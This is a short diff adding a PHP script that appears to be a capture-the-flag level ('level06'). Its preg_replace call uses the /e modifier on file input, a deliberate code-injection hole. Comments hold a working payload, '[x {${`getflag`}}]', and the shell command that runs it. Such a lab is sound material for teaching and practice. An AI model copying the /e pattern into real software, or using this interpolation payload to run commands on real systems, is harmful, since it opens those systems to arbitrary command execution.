@@ -1,1 +1,21 @@
-TODO
+#!/usr/bin/php
+<?php
+function y($arg1) {
+    $arg1 = preg_replace("/\./", " x ", $arg1);
+    $arg1 = preg_replace("/@/", " y", $arg1);
+    return $arg1;
+}
+
+function x($arg1, $unused) {
+    $ret = file_get_contents($arg1);
+    // $ret == "[x {${`getflag`}}]"
+    $ret = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $ret);
+    $ret = preg_replace("/\[/", "(", $ret);
+    $ret = preg_replace("/\]/", ")", $ret);
+    return $ret;
+}
+
+$res = x($argv[1], $argv[2]);
+print $res;
+#echo '[x {${`getflag`}}]' >/tmp/arg; ./level06 /tmp/arg unused_argument
+?>
